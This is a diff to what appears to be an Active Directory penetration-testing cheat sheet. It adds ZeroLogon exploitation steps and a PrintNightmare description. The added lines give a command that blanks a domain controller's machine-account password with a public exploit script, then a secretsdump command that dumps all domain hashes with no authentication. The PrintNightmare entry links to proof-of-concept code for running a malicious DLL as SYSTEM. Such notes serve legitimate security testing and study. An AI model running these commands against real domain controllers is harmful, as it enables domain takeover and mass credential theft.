@@ -459,9 +459,19 @@ wscript.exe .\realtest.vbs
 
 ## Low Hanging Fruits
 ### ZeroLogon
+Set the computer account's password to null allowing attackers to perform [DCSync](#dcsync) attack with null authentication 
+1. Run exploit script [here](https://github.com/risksense/zerologon.git)
+```
+python3 set_empty_pw.py DC01 10.10.10.10
+```
+
+2. Perform DCSync with null auth
+```bash
+python3 secretsdump.py -just-dc -no-pass testlab/DC01\$@10.10.10.10
+```
 
 ### PrintNightmare
-Available POC can be found here
+Abusing printer spooler service (CVE-2021-34527) to load malicious DLL and execute as SYSTEM. Available POCs can be found here
 | Link          | Authors         |Language|
 | ------------- | ------------- | ----- |
 | https://github.com/cube0x0/CVE-2021-1675      | [@cube0x0](https://twitter.com/cube0x0) | python, c# |
